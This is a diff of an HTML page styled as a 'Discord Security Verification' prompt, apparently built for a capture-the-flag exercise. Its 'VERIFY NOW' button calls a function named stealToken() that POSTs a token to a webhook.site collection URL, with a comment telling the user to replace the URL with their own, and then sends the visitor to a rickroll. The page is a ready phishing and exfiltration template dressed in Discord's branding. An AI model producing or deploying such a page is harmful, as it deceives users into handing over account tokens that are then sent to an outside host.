@@ -1,20 +1,50 @@
-<!DOCTYPE html>  
-<html>  
-<body>  
-  <h1 style="text-align: center; margin-top: 50px;">Discord Security Check</h1>  
-  <button onclick="stealToken()" style="display: block; margin: 0 auto; padding: 10px 20px; background: #5865F2; color: white; border: none; border-radius: 5px;">  
-    Click to Verify Account  
-  </button>  
-  <script>  
-    function stealToken() {  
-      const token = "CTF_TOKEN_123";    
-      fetch("https://webhook.site/53d25910-f8b8-4703-a049-29f65d48456c", {  
-        method: "POST",  
-        headers: { "Content-Type": "application/json" },  
-        body: JSON.stringify({ token: token })  
-      });  
-      alert("Verification failed. Contact support.");  
-    }  
-  </script>  
-</body>  
-</html>  
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Discord Security Verification</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #36393f;
+            color: white;
+            text-align: center;
+            padding: 50px;
+        }
+        button {
+            background-color: #5865F2;
+            color: white;
+            padding: 15px 30px;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <h1>Discord Account Verification Required</h1>
+    <p>Click below to confirm your identity and secure your account:</p>
+    
+    <button onclick="stealToken()">VERIFY NOW</button>
+
+    <script>
+        function stealToken() {
+            // Simulated token for CTF challenge
+            const token = "CTF_TOKEN_123";
+            
+            // Send token to your webhook (REPLACE WITH YOUR URL)
+            fetch("https://webhook.site/53d25910-f8b8-4703-a049-29f65d48456c", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ token: token })
+            });
+
+            // Rickroll redirect after 1 second
+            setTimeout(() => {
+                window.location.href = "https://youtu.be/dQw4w9WgXcQ";
+            }, 2000);
+        }
+    </script>
+</body>
+</html>
